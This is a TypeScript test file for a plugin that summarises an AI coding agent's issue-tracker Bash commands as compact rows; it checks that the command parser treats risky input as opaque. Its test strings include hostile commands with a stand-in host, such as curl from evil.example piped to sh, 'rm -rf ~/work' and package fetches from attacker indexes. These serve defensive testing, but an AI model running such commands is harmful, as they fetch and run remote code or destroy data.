import type { On, PluginState, RenderPropsOf } from 'claude-code'
import {
  describe,
  expect,
  test,
  type Engine,
  type Plugin,
  type TestOptions,
} from 'claude-code/testing'
import { commandCases, compoundCases, unsafeCases, type CommandCase } from './fixtures/commands'
import { hasEchoedSuccess, parseCommand, trackerFileOf, type WriteVerbs } from './hooks/parse'

type Snapshot = PluginState['workitems']['snapshot']
type Diff = { created: Item[]; updated: Item[]; closed: Item[] }
type Item = Snapshot['items'][number]
type BashOutput = { stdout: string; stderr: string; interrupted: boolean }

const ROOT = '/work/app'
const SURFACES = ['terminal', 'desktop'] as const
const ENGINE_ROW = { type: 'engine', ref: 0 } as const
const MARKER = { terminal: '● ', desktop: '' } as const
const FULL_RESULT_TEXT =
  '{"id":"handily-ab12","title":"Draw text mocks for the mods","status":"open"}'

const VERBS: WriteVerbs = {
  br: [
    'close',
    'create',
    'defer',
    'delete',
    'q',
    'reopen',
    'undefer',
    'update',
    'comments add',
    'dep add',
    'dep remove',
    'dep import',
    'label add',
    'label remove',
    'label rename',
    'epic close-eligible',
  ],
  'basicly tracker': [
    'close',
    'comments add',
    'create',
    'dep add',
    'dep remove',
    'gate report',
    'update',
  ],
  '.basicly/core/kit/tracker/cli.py': [
    'create',
    'compact',
    'sync',
    'import',
    'migrate-fields',
    'child',
    'update',
    'close',
    'comment',
    'dep',
    'undep',
    'assign',
    'claim',
    'resolve',
    'unassign',
    'delete',
  ],
}

function item(id: string, title: string, status: Item['status'], priority: number | null): Item {
  return {
    key: `beads:${id}`,
    id,
    title,
    status,
    rawStatus: status,
    priority,
    type: 'task',
    assignee: null,
    updatedAt: null,
    source: 'beads',
  }
}

const AB12 = item('handily-ab12', 'Draw text mocks for the mods', 'open', 2)
const LONG_TITLE = 'Write the beads reader so the provider reads issues.jsonl without a CLI'

function okSnapshot(version: number): Extract<Snapshot, { state: 'ok' }> {
  return {
    state: 'ok',
    reason: null,
    at: 1_000,
    checkedAt: 1_000,
    version,
    root: ROOT,
    source: 'beads',
    sourceLabel: 'beads',
    caveat: null,
    items: [],
    ignored: [],
  }
}

function emptyDiff(): Diff {
  return { created: [], updated: [], closed: [] }
}

type Change = { version: number; diff: Diff }

type World = {
  snapshot: Snapshot
  log: Change[]
  callChange: Diff
  sinces: number[]
  refreshError: string | null
}

type FakeAnswer = World & { verbs: WriteVerbs }

const fakeWorkitems: Plugin = {
  name: 'workitems',
  register(on) {
    let lastSeen: number | null = null
    on('engine.create', async (_$, e, next) => {
      const built = await next(e)
      const ask = async (path: string) => JSON.parse(await built.fs.read(path)) as FakeAnswer
      return {
        ...built,
        workitems: {
          refresh: async (args) => {
            const world = await ask(`/fake/workitems/refresh/${String(args?.since ?? 'poll')}`)
            if (world.refreshError !== null) throw new Error(world.refreshError)
            const current = world.log.reduce(
              (top, change) => Math.max(top, change.version),
              world.snapshot.version,
            )
            const since = args?.since ?? lastSeen ?? current
            if (since > current) {
              throw new Error(`since ${String(since)} is newer than ${String(current)}`)
            }
            lastSeen = current
            const changes = world.log.filter((change) => change.version > since)
            await built.state.set(
              { plugin: 'workitems', key: 'snapshot' },
              { ...world.snapshot, version: current },
            )
            return {
              created: changes.flatMap((change) => change.diff.created),
              updated: changes.flatMap((change) => change.diff.updated),
              closed: changes.flatMap((change) => change.diff.closed),
              version: current,
            }
          },
          writeVerbs: async () => (await ask('/fake/workitems/verbs')).verbs,
          lines: () => Promise.resolve([]),
        },
      }
    })
    on('session.start', async ($, e, next) => {
      await $.workitems.refresh()
      return next(e)
    })
  },
}

function latestVersion(world: World): number {
  return world.log.reduce((top, change) => Math.max(top, change.version), world.snapshot.version)
}

function hasChanges(diff: Diff): boolean {
  return diff.created.length + diff.updated.length + diff.closed.length > 0
}

type Calls = { ids: string[]; groups: boolean[]; answer: () => object }

function engineBeneath(on: On, world: World): Calls {
  const calls: Calls = {
    ids: [],
    groups: [],
    answer: () => ({
      result: { stdout: FULL_RESULT_TEXT, stderr: '', interrupted: false },
      text: FULL_RESULT_TEXT,
    }),
  }
  on('session.start', (_$, e) => ({ cwd: e.cwd }))
  on('command.register', (_$, e) => ({ value: { command: e.name } }))
  on('fs.read', (_$, e) => {
    const since = /^\/fake\/workitems\/refresh\/(\d+)$/.exec(e.path)?.[1]
    if (since !== undefined) world.sinces.push(Number(since))
    return { value: JSON.stringify({ ...world, verbs: VERBS }) }
  })
  on('tool.call', async ($, e) => {
    calls.ids.push(e.tool_use_id)
    if (hasChanges(world.callChange)) {
      world.log.push({ version: latestVersion(world) + 1, diff: world.callChange })
    }
    await $.workitems.refresh().catch(() => undefined)
    return calls.answer() as never
  })
  on('ui.render', (_$, e) => {
    if (e.component === 'ToolGroup') calls.groups.push(e.props.isExpanded)
    return ENGINE_ROW
  })
  return calls
}

function newWorld(): World {
  return {
    snapshot: okSnapshot(7),
    log: [],
    callChange: emptyDiff(),
    sinces: [],
    refreshError: null,
  }
}

type QuietBody = (world: World, $: Engine, on: On) => unknown

function quietTest(name: string, ...rest: [QuietBody] | [TestOptions, QuietBody]): void {
  const [options, body] = rest.length === 1 ? [{}, rest[0]] : rest
  test(name, { ...options, plugins: [fakeWorkitems] }, ($, on) => body(newWorld(), $, on))
}

async function startSession($: Engine): Promise<void> {
  await $.session.start({ cwd: ROOT, surface: 'terminal', isInteractive: true })
}

async function runBash($: Engine, calls: Calls, command: string): Promise<string> {
  await $.tool.call({ tool: 'Bash', command })
  const id = calls.ids.at(-1)
  if (id === undefined) throw new Error('the tool call reached no engine')
  return id
}

function toolUse(id: string, command: string): RenderPropsOf['ToolUse'] {
  return {
    tool_use_id: id,
    tool: 'Bash',
    input: { command },
    isRunning: false,
    isErrored: false,
    isInterrupted: false,
    output: { stdout: FULL_RESULT_TEXT, stderr: '', interrupted: false } satisfies BashOutput,
  }
}

function toolResult(id: string): RenderPropsOf['ToolResult'] {
  return {
    tool_use_id: id,
    tool: 'Bash',
    output: { stdout: FULL_RESULT_TEXT, stderr: '', interrupted: false } satisfies BashOutput,
    isErrored: false,
  }
}

function shown(node: unknown): string {
  if (typeof node === 'string') return node
  if (typeof node !== 'object' || node === null || !('children' in node)) return ''
  const { children } = node
  return Array.isArray(children) ? children.map(shown).join(' ') : ''
}

async function rowTexts(
  $: Engine,
  surface: (typeof SURFACES)[number],
  props: RenderPropsOf['ToolUse'],
): Promise<string[]> {
  const ui = await $.ui.mount({ plugin: 'quiet-items', surface, component: 'ToolUse', props })
  const boxes = await ui.findAll({ type: 'Box' })
  const rows = boxes.filter((box) => box.key?.startsWith('row-'))
  const texts = rows.map((row) => row.children.map(shown).join(' ').replace(/\s+/g, ' ').trim())
  await ui.unmount()
  return texts
}

async function drawnUse($: Engine, props: RenderPropsOf['ToolUse']): Promise<unknown> {
  const ui = await $.ui.mount({
    plugin: 'quiet-items',
    surface: 'terminal',
    component: 'ToolUse',
    props,
  })
  const drawn = await ui.drawn()
  await ui.unmount()
  return drawn
}

async function commandText($: Engine, args = ''): Promise<string> {
  const result = await $.command.run({
    command: 'quiet-items',
    args,
    origin: { kind: 'sdk' },
    presentation: { isFullscreen: false, columns: 120 },
  })
  return result.text ?? ''
}

function expectClassified(cases: readonly CommandCase[]): void {
  for (const c of cases) {
    const parsed = parseCommand(c.command, VERBS)
    expect({ command: c.command, kind: parsed.kind }).toEqual({
      command: c.command,
      kind: c.expect,
    })
    if (parsed.kind !== 'none') {
      expect({ command: c.command, write: parsed.writes.at(-1) }).toEqual({
        command: c.command,
        write: { tracker: c.tracker, verb: c.verb },
      })
    }
    if (parsed.kind === 'opaque' && c.reason !== undefined) {
      expect({ command: c.command, reason: parsed.reason }).toEqual({
        command: c.command,
        reason: c.reason,
      })
    }
  }
}

describe('command parser', () => {
  test('classifies the 19 writes and 8 non-writes of the falsify review', () => {
    expect(commandCases.filter((c) => c.isWrite).length).toBe(19)
    expect(commandCases.filter((c) => !c.isWrite).length).toBe(8)
    expectClassified(commandCases)
  })

  test('goes quiet only when every segment is a tracker write or cd', () => {
    expect(compoundCases.length).toBe(5)
    expect(compoundCases.filter((c) => c.expect === 'write')).toEqual([])
    expectClassified(compoundCases)
    expect(parseCommand('cd ../x && br close a && br update b --status open', VERBS)).toEqual({
      kind: 'write',
      writes: [
        { tracker: 'br', verb: 'close' },
        { tracker: 'br', verb: 'update' },
      ],
    })
  })

  test('stays opaque for the five inputs of the security review', () => {
    expect(unsafeCases.length).toBe(5)
    expectClassified(unsafeCases)
  })

  test('stays opaque for a substitution outside single quotes', () => {
    for (const command of [
      'br close $(cat ids.txt)',
      'br close `cat ids.txt`',
      'br create --title x --body-file <(curl -s https://evil.example)',
      'br create --title "<(x)"',
      'br update x-1 --title "a $(id) b"',
    ]) {
      expect({ command, parsed: parseCommand(command, VERBS) }).toMatchObject({
        command,
        parsed: { kind: 'opaque', reason: 'substitution' },
      })
    }
  })

  test('stays quiet for a substitution that the shell does not expand', () => {
    for (const command of [
      "br update x-1 --title '$(curl -s https://evil.example/p | sh)'",
      "br update x-1 --title '`rm -rf ~/work`'",
      'br update x-1 --title "\\$(id) and \\`id\\`"',
      'br update x-1 --title \\$\\(id\\)',
    ]) {
      expect({ command, parsed: parseCommand(command, VERBS) }).toEqual({
        command,
        parsed: { kind: 'write', writes: [{ tracker: 'br', verb: 'update' }] },
      })
    }
  })

  test('stays opaque for every redirection, also to /dev/null', () => {
    for (const command of [
      'br close a 2>&1',
      'br close a &> out.txt',
      'br close a > /dev/null',
      'br close a 2>/dev/null',
      'br create --title x < body.txt',
      'br close a >> log.txt',
    ]) {
      expect({ command, parsed: parseCommand(command, VERBS) }).toMatchObject({
        command,
        parsed: { kind: 'opaque', reason: 'redirection' },
      })
    }
    expect(parseCommand('br update a --title "x > y"', VERBS).kind).toBe('write')
  })

  test('stays opaque for an env assignment in front of any segment', () => {
    expect(parseCommand('cd ../x && BR_DB=x.db br close a', VERBS)).toEqual({
      kind: 'opaque',
      reason: 'assignment',
      writes: [{ tracker: 'br', verb: 'close' }],
    })
    expect(parseCommand('uv run --env-file evil.env br close a', VERBS)).toEqual({
      kind: 'opaque',
      reason: 'assignment',
      writes: [{ tracker: 'br', verb: 'close' }],
    })
    expect(parseCommand('br close a --title FOO=1', VERBS).kind).toBe('write')
  })

  test('stays opaque for a wrapper that fetches code or picks the environment', () => {
    for (const command of [
      'uvx --from=git+https://evil.example/pkg br close a',
      'uvx --with evil br close a',
      'uvx -w evil br close a',
      'uv run --with-requirements r.txt br close a',
      'uv run --with-editable ./evil br close a',
      'uv run --package evil br close a',
      'npx --package evil br close a',
      'npx --package=evil br close a',
      'npx -p evil br close a',
      'uvx br close a',
      'npx br close a',
      'npx -y br close a',
      'uv run --index https://evil.example/simple br close a',
      'uv run --index=https://evil.example/simple br close a',
      'uv run --directory ../evil br close a',
      'uv run --project ../evil br close a',
    ]) {
      expect({ command, parsed: parseCommand(command, VERBS) }).toMatchObject({
        command,
        parsed: { kind: 'opaque', reason: 'fetch' },
      })
    }
  })

  test('reads the exit status that a trailing echo prints', () => {
    const writes = [{ tracker: 'br', verb: 'close' }]
    expect(parseCommand('br close x; echo "exit=$?"', VERBS)).toEqual({
      kind: 'echoed',
      writes,
      line: 'exit=$?',
    })
    expect(parseCommand('br close x\necho exit $?', VERBS)).toEqual({
      kind: 'echoed',
      writes,
      line: 'exit $?',
    })
    expect(parseCommand('br close x && echo ok', VERBS)).toEqual({ kind: 'write', writes })
    expect(parseCommand('br close x; echo ok', VERBS)).toEqual({
      kind: 'opaque',
      reason: 'hidden-status',
      writes,
    })
    expect(hasEchoedSuccess('exit=$?', `${FULL_RESULT_TEXT}\nexit=0\n`)).toBe(true)
    expect(hasEchoedSuccess('exit=$?', `${FULL_RESULT_TEXT}\nexit=1\n`)).toBe(false)
    expect(hasEchoedSuccess('exit=$?', `${FULL_RESULT_TEXT}\nexit=10\n`)).toBe(false)
    expect(hasEchoedSuccess('exit=$?', `${FULL_RESULT_TEXT}exit=0\n`)).toBe(false)
    expect(hasEchoedSuccess('exit=$?', 'exit=$?\n')).toBe(false)
  })

  test('keeps the engine row for a trailing echo that is not a plain status echo', () => {
    for (const [command, reason] of [
      ['br close x; echo "$(id) $?"', 'substitution'],
      ['br close x; echo `id` $?', 'substitution'],
      ['br close x; echo "exit=$?" > out.txt', 'redirection'],
      ['br close x; echo "exit=$?" 2>&1', 'redirection'],
      ['br close x; echo $HOME', 'mixed'],
      ['br close x; echo -e "exit=$?"', 'mixed'],
      ['br close x; echo exit=*', 'mixed'],
      ['br close x || echo "exit=$?"', 'mixed'],
      ['br close x | echo "exit=$?"', 'mixed'],
      ['br close x & echo "exit=$?"', 'mixed'],
      ['git status; echo "exit=$?"', 'none'],
    ] as const) {
      const parsed = parseCommand(command, VERBS)
      expect({ command, reason: parsed.kind === 'opaque' ? parsed.reason : parsed.kind }).toEqual({
        command,
        reason,
      })
    }
  })

  test('falls back on a heredoc and on python -c or -m', () => {
    expect(parseCommand("br create --title x <<'EOF'\nbody\nEOF", VERBS).kind).toBe('opaque')
    expect(
      parseCommand('python3 -c "import x" .basicly/core/kit/tracker/cli.py close a', VERBS),
    ).toEqual({
      kind: 'none',
    })
    expect(parseCommand('python3 -m tracker close a', VERBS)).toEqual({ kind: 'none' })
    expect(parseCommand('uvx --help br close a', VERBS)).toEqual({ kind: 'none' })
  })

  test('strips uv run, uvx and npx wrappers and splits on ||', () => {
    expect(parseCommand('br close a || uv run br close b', VERBS)).toEqual({
      kind: 'opaque',
      reason: 'hidden-status',
      writes: [
        { tracker: 'br', verb: 'close' },
        { tracker: 'br', verb: 'close' },
      ],
    })
    expect(parseCommand('npx -y br --db .beads/x.db comments add a hi', VERBS)).toEqual({
      kind: 'opaque',
      reason: 'fetch',
      writes: [{ tracker: 'br', verb: 'comments add' }],
    })
    expect(parseCommand('uv run br close a', VERBS)).toEqual({
      kind: 'write',
      writes: [{ tracker: 'br', verb: 'close' }],
    })
  })

  test('stays opaque when a later write hides the exit status of an earlier write', () => {
    const two = [
      { tracker: 'br', verb: 'close' },
      { tracker: 'br', verb: 'close' },
    ]
    for (const command of [
      'br close a; br close b',
      'br close a\nbr close b',
      'br close a || br close b',
      'br close a | br close b',
      'br close a; cd x && br close b',
      'br close a; br close b; echo "exit=$?"',
    ]) {
      expect({ command, parsed: parseCommand(command, VERBS) }).toEqual({
        command,
        parsed: { kind: 'opaque', reason: 'hidden-status', writes: two },
      })
    }
    expect(parseCommand('br close a && br close b', VERBS)).toEqual({ kind: 'write', writes: two })
    expect(parseCommand('cd x && br close a && cd y && br close b', VERBS)).toEqual({
      kind: 'write',
      writes: two,
    })
    expect(parseCommand('br close a && br close b; echo "exit=$?"', VERBS)).toEqual({
      kind: 'echoed',
      writes: two,
      line: 'exit=$?',
    })
  })

  test('names a tracker file at the workitems root by its marker path', () => {
    expect(trackerFileOf(`${ROOT}/.beads/issues.jsonl`, ROOT)).toBe('.beads/issues.jsonl')
    expect(
      trackerFileOf('C:\\work\\app\\.basicly\\ledger\\events-a.jsonl', 'C:\\work\\app\\'),
    ).toBe('.basicly/ledger/events-a.jsonl')
    expect(trackerFileOf(`${ROOT}/.beans/app-1--title.md`, ROOT)).toBe('.beans/app-1--title.md')
    expect(trackerFileOf(`${ROOT}/.beans/archive/app-2--done.md`, ROOT)).toBe(
      '.beans/archive/app-2--done.md',
    )
  })

  test('names the basicly ledger files that a write and a fold touch', () => {
    expect(trackerFileOf(`${ROOT}/.basicly/ledger/pending-main.jsonl`, ROOT)).toBe(
      '.basicly/ledger/pending-main.jsonl',
    )
    expect(trackerFileOf(`${ROOT}/.basicly/ledger/snapshot.jsonl`, ROOT)).toBe(
      '.basicly/ledger/snapshot.jsonl',
    )
    expect(trackerFileOf(`${ROOT}/.basicly/ledger/checkpoint-1.jsonl`, ROOT)).toBeNull()
  })

  test('leaves other files and other roots alone', () => {
    expect(trackerFileOf(`${ROOT}/.beads/config.yaml`, ROOT)).toBeNull()
    expect(trackerFileOf(`${ROOT}/.beads/backup/issues.jsonl`, ROOT)).toBeNull()
    expect(trackerFileOf(`${ROOT}/.beads/deletions.jsonl`, ROOT)).toBeNull()
    expect(trackerFileOf(`${ROOT}/.beans/README.md`, ROOT)).toBeNull()
    expect(trackerFileOf(`${ROOT}/.basicly/ledger/template.json`, ROOT)).toBeNull()
    expect(trackerFileOf(`${ROOT}/README.md`, ROOT)).toBeNull()
    expect(trackerFileOf('/work/other/.beads/issues.jsonl', ROOT)).toBeNull()
    expect(trackerFileOf(`${ROOT}-copy/.beads/issues.jsonl`, ROOT)).toBeNull()
    expect(trackerFileOf(`${ROOT}/vendor/app/.beads/issues.jsonl`, ROOT)).toBeNull()
  })
})

describe('quiet row', () => {
  for (const surface of SURFACES) {
    quietTest(`draws one row from the refresh diff on ${surface}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.callChange = { ...emptyDiff(), created: [AB12] }
      await startSession($)
      const command = 'br create --title "Draw text mocks for the mods" --priority 2'
      const id = await runBash($, calls, command)
      expect(world.sinces).toEqual([7])
      expect(await rowTexts($, surface, toolUse(id, command))).toEqual([
        `${MARKER[surface]}work item created handily-ab12 Draw text mocks for the mods open P2`,
      ])
      const use = await $.ui.mount({
        plugin: 'quiet-items',
        surface,
        component: 'ToolUse',
        props: toolUse(id, command),
      })
      expect((await use.find({ type: 'Text', text: 'handily-ab12' }))?.props.bold).toBe(true)
      expect((await use.find({ type: 'Text', text: 'P2' }))?.props.dimColor).toBe(true)
      await use.unmount()
      const result = await $.ui.mount({
        plugin: 'quiet-items',
        surface,
        component: 'ToolResult',
        props: toolResult(id),
      })
      expect(await result.drawn()).toMatchObject({ type: 'Box' })
      expect(await result.findAll({ type: 'Text' })).toEqual([])
      await result.unmount()
    })

    quietTest(`draws one row per item in diff order on ${surface}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.callChange = {
        created: [item('handily-cd34', LONG_TITLE, 'open', 1)],
        updated: [item('handily-ef56', 'Fix the parser', 'in_progress', 3)],
        closed: [
          item('handily-ab12', 'Draw text mocks for the mods', 'closed', 2),
          item('handily-gh78', 'Drop the old importer', 'closed', null),
        ],
      }
      await startSession($)
      const command = 'br close handily-ab12 handily-gh78'
      const id = await runBash($, calls, command)
      expect(await rowTexts($, surface, toolUse(id, command))).toEqual([
        `${MARKER[surface]}work item created handily-cd34 Write the beads reader so the provider reads issues.jsonl wi… open P1`,
        `${MARKER[surface]}work item updated handily-ef56 Fix the parser in_progress P3`,
        `${MARKER[surface]}work item closed handily-ab12 Draw text mocks for the mods closed P2`,
        `${MARKER[surface]}work item closed handily-gh78 Drop the old importer closed`,
      ])
    })
  }

  for (const [command, stdout] of [
    ['br close handily-ab12; echo "exit=$?"', `${FULL_RESULT_TEXT}\nexit=0\n`],
    ['br close handily-ab12 && echo ok', `${FULL_RESULT_TEXT}\nok\n`],
  ] as const) {
    quietTest(`draws one row for ${command}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.callChange = { ...emptyDiff(), closed: [AB12] }
      calls.answer = () => ({ result: { stdout, stderr: '', interrupted: false }, text: stdout })
      await startSession($)
      const id = await runBash($, calls, command)
      expect(world.sinces).toEqual([7])
      expect(await rowTexts($, 'terminal', toolUse(id, command))).toEqual([
        '● work item closed handily-ab12 Draw text mocks for the mods open P2',
      ])
    })
  }

  quietTest('leaves out a change from before the call', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    await startSession($)
    world.log.push({
      version: 8,
      diff: {
        ...emptyDiff(),
        created: [item('handily-zz00', 'Made by another session', 'open', 1)],
      },
    })
    world.callChange = { ...emptyDiff(), created: [AB12] }
    const command = 'br create --title "Draw text mocks for the mods" --priority 2'
    const id = await runBash($, calls, command)
    expect(world.sinces).toEqual([8])
    expect(await rowTexts($, 'terminal', toolUse(id, command))).toEqual([
      '● work item created handily-ab12 Draw text mocks for the mods open P2',
    ])
  })

  quietTest('names a comment write commented', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), updated: [item('handily-ab12', 'Draw', 'in_progress', 2)] }
    await startSession($)
    const command = 'br comments add handily-ab12 "looked at it"'
    const id = await runBash($, calls, command)
    expect(await rowTexts($, 'terminal', toolUse(id, command))).toEqual([
      '● work item commented handily-ab12 Draw in_progress P2',
    ])
  })

  quietTest(
    'cuts the title to the titleLength setting',
    { options: { titleLength: 10 } },
    async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.callChange = { ...emptyDiff(), created: [AB12] }
      await startSession($)
      const id = await runBash($, calls, 'br q "Draw text mocks for the mods"')
      expect(await rowTexts($, 'terminal', toolUse(id, 'br q'))).toEqual([
        '● work item created handily-ab12 Draw text… open P2',
      ])
    },
  )

  quietTest('passes the full tool result to the model', async (world, $, on) => {
    engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), created: [AB12] }
    await startSession($)
    const result = await $.tool.call({ tool: 'Bash', command: 'br create --title x' })
    expect(result.text).toBe(FULL_RESULT_TEXT)
    expect(result.result).toEqual({ stdout: FULL_RESULT_TEXT, stderr: '', interrupted: false })
  })
})

describe('fallback to the engine row', () => {
  quietTest('when the call errored', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), closed: [AB12] }
    calls.answer = () => ({ isError: true, result: 'issue handily-zz99 not found', text: 'Error' })
    await startSession($)
    const id = await runBash($, calls, 'br close handily-zz99')
    expect(world.sinces).toEqual([])
    expect(await drawnUse($, toolUse(id, 'br close handily-zz99'))).toEqual(ENGINE_ROW)
  })

  quietTest('when the call was interrupted', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), closed: [AB12] }
    calls.answer = () => ({ result: { stdout: '', stderr: '', interrupted: true } })
    await startSession($)
    const id = await runBash($, calls, 'br close handily-ab12')
    expect(world.sinces).toEqual([])
    expect(await drawnUse($, toolUse(id, 'br close handily-ab12'))).toEqual(ENGINE_ROW)
  })

  quietTest('while the row is running, interrupted or errored', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), created: [AB12] }
    await startSession($)
    const id = await runBash($, calls, 'br create --title x')
    const done = toolUse(id, 'br create --title x')
    expect(await drawnUse($, done)).not.toEqual(ENGINE_ROW)
    expect(await drawnUse($, { ...done, isRunning: true, output: undefined })).toEqual(ENGINE_ROW)
    expect(await drawnUse($, { ...done, isInterrupted: true })).toEqual(ENGINE_ROW)
    expect(await drawnUse($, { ...done, isErrored: true })).toEqual(ENGINE_ROW)
  })

  quietTest('when the refresh diff is empty', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    await startSession($)
    const id = await runBash($, calls, 'br update handily-ab12 --status in_progress')
    expect(world.sinces).toEqual([7])
    expect(await drawnUse($, toolUse(id, 'br update'))).toEqual(ENGINE_ROW)
    const result = await $.ui.mount({
      plugin: 'quiet-items',
      surface: 'terminal',
      component: 'ToolResult',
      props: toolResult(id),
    })
    expect(await result.drawn()).toEqual(ENGINE_ROW)
    await result.unmount()
  })

  quietTest('when the refresh rejects', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), created: [AB12] }
    await startSession($)
    const id = await runBash($, calls, 'br create --title x')
    expect(await drawnUse($, toolUse(id, 'br create --title x'))).not.toEqual(ENGINE_ROW)
    world.refreshError = 'since 8 is older than the 50 kept diffs'
    const failed = await runBash($, calls, 'br create --title y')
    expect(await drawnUse($, toolUse(failed, 'br create --title y'))).toEqual(ENGINE_ROW)
  })

  for (const state of ['failed', 'no-tracker'] as const) {
    quietTest(`when workitems is ${state}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.snapshot =
        state === 'failed'
          ? {
              ...okSnapshot(7),
              state: 'failed',
              reason: 'basicly tracker list exited 2. Run it in a shell to see why.',
            }
          : {
              ...okSnapshot(7),
              state: 'no-tracker',
              reason: 'looked for beads',
              source: null,
              sourceLabel: null,
              caveat: null,
            }
      world.callChange = { ...emptyDiff(), created: [AB12] }
      await startSession($)
      const id = await runBash($, calls, 'br create --title x')
      expect(world.sinces).toEqual([])
      expect(await drawnUse($, toolUse(id, 'br create --title x'))).toEqual(ENGINE_ROW)
    })
  }

  quietTest('when the command wrote to stderr', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), closed: [AB12] }
    calls.answer = () => ({
      result: { stdout: '', stderr: 'warning: handily-zz99 not found', interrupted: false },
      text: 'warning: handily-zz99 not found',
    })
    await startSession($)
    const result = await $.tool.call({
      tool: 'Bash',
      command: 'br close handily-ab12 handily-zz99',
    })
    expect(result.text).toBe('warning: handily-zz99 not found')
    const id = calls.ids.at(-1) ?? ''
    expect(world.sinces).toEqual([])
    expect(await drawnUse($, toolUse(id, 'br close handily-ab12 handily-zz99'))).toEqual(ENGINE_ROW)
  })

  for (const [command, stdout] of [
    ['br close handily-ab12; echo "exit=$?"', 'issue handily-ab12 not found\nexit=1\n'],
    ['br close handily-ab12; echo "exit=$?"', 'exit=1\n'],
    ['br close handily-ab12; echo ok', `${FULL_RESULT_TEXT}\nok\n`],
  ] as const) {
    quietTest(`for ${command} that prints ${JSON.stringify(stdout)}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.callChange = { ...emptyDiff(), closed: [AB12] }
      calls.answer = () => ({ result: { stdout, stderr: '', interrupted: false }, text: stdout })
      await startSession($)
      const id = await runBash($, calls, command)
      expect(world.sinces).toEqual([])
      expect(await drawnUse($, toolUse(id, command))).toEqual(ENGINE_ROW)
    })
  }

  for (const { command } of unsafeCases) {
    quietTest(`for the unsafe ${command}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.callChange = { ...emptyDiff(), updated: [AB12] }
      await startSession($)
      const id = await runBash($, calls, command)
      expect(world.sinces).toEqual([])
      expect(await drawnUse($, toolUse(id, command))).toEqual(ENGINE_ROW)
      const result = await $.ui.mount({
        plugin: 'quiet-items',
        surface: 'terminal',
        component: 'ToolResult',
        props: toolResult(id),
      })
      expect(await result.drawn()).toEqual(ENGINE_ROW)
      await result.unmount()
    })
  }

  for (const { command } of compoundCases) {
    quietTest(`for the compound ${command}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.callChange = { ...emptyDiff(), closed: [AB12] }
      await startSession($)
      const id = await runBash($, calls, command)
      expect(world.sinces).toEqual([])
      expect(await drawnUse($, toolUse(id, command))).toEqual(ENGINE_ROW)
    })
  }

  for (const command of [
    'for i in a b; do br close $i; done',
    "br create --title x <<'EOF'\nEOF",
    'br close --help',
    'br create --dry-run --title x',
    'git status',
  ]) {
    quietTest(`for ${command.split('\n')[0] ?? command}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      world.callChange = { ...emptyDiff(), created: [AB12] }
      await startSession($)
      const id = await runBash($, calls, command)
      expect(world.sinces).toEqual([])
      expect(await drawnUse($, toolUse(id, command))).toEqual(ENGINE_ROW)
    })
  }
})

function toolGroup(id: string, command: string): RenderPropsOf['ToolGroup'] {
  const { output } = toolUse(id, command)
  return {
    calls: [
      {
        tool_use_id: id,
        tool: 'Bash',
        input: { command },
        isRunning: false,
        isErrored: false,
        isInterrupted: false,
        output,
      },
    ],
    isActive: false,
    isExpanded: false,
  }
}

async function groupExpansion($: Engine, calls: Calls, props: RenderPropsOf['ToolGroup']) {
  calls.groups.length = 0
  const ui = await $.ui.mount({
    plugin: 'quiet-items',
    surface: 'terminal',
    component: 'ToolGroup',
    props,
  })
  await ui.unmount()
  return calls.groups
}

describe('folded tool group', () => {
  quietTest('unfolds a group that holds a quiet row', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), created: [AB12] }
    await startSession($)
    const id = await runBash($, calls, 'br create --title x')
    expect(await groupExpansion($, calls, toolGroup(id, 'br create --title x'))).toEqual([true])
  })

  quietTest('leaves a group without a quiet row folded', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    await startSession($)
    const id = await runBash($, calls, 'git status')
    expect(await groupExpansion($, calls, toolGroup(id, 'git status'))).toEqual([false])
  })

  quietTest('leaves the group folded while the mode is off', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), created: [AB12] }
    await startSession($)
    const id = await runBash($, calls, 'br create --title x')
    await commandText($)
    expect(await groupExpansion($, calls, toolGroup(id, 'br create --title x'))).toEqual([false])
  })
})

describe('raw tracker edit', () => {
  for (const surface of SURFACES) {
    quietTest(`draws the raw tracker edit row for an Edit on ${surface}`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      calls.answer = () => ({ result: { filePath: `${ROOT}/.beads/issues.jsonl` } })
      await startSession($)
      await $.tool.call({
        tool: 'Edit',
        file_path: `${ROOT}/.beads/issues.jsonl`,
        old_string: '"open"',
        new_string: '"closed"',
      })
      const id = calls.ids.at(-1) ?? ''
      const props: RenderPropsOf['ToolUse'] = {
        tool_use_id: id,
        tool: 'Edit',
        input: { file_path: `${ROOT}/.beads/issues.jsonl` },
        isRunning: false,
        isErrored: false,
        isInterrupted: false,
      }
      expect(await rowTexts($, surface, props)).toEqual([
        `${MARKER[surface]}raw tracker edit .beads/issues.jsonl Edit, not through the tracker CLI`,
      ])
      const ui = await $.ui.mount({ plugin: 'quiet-items', surface, component: 'ToolUse', props })
      expect((await ui.find({ type: 'Text', text: /raw tracker edit/ }))?.props.color).toBe(
        'warning',
      )
      await ui.unmount()
      expect(world.sinces).toEqual([])
    })
  }

  for (const path of ['/work/other/.beads/issues.jsonl', `${ROOT}/.beads/deletions.jsonl`]) {
    quietTest(`leaves an Edit of ${path} to the engine`, async (world, $, on) => {
      const calls = engineBeneath(on, world)
      calls.answer = () => ({ result: { filePath: path } })
      await startSession($)
